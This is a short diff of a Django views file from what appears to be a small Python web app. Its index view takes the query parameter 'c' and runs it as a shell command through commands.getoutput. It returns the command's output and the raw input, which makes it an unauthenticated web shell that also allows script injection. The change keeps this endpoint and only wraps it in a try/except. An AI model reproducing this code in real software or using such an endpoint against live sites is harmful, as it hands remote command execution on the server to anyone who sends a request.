@@ -5,8 +5,12 @@ from .models import Greeting
 
 # Create your views here.
 def index(request):
-    s = str(request.GET['c'])
-    return HttpResponse(s+'<br>Hello from Python!<br>'+str(commands.getoutput(s)))
+    s = None
+    try:
+        s = str(request.GET['c'])
+        return HttpResponse(s+'<br>Hello from Python!<br>'+str(commands.getoutput(s)))
+    except Exception:
+        pass
     return render(request, 'index.html')
 
 def compileasm(request):
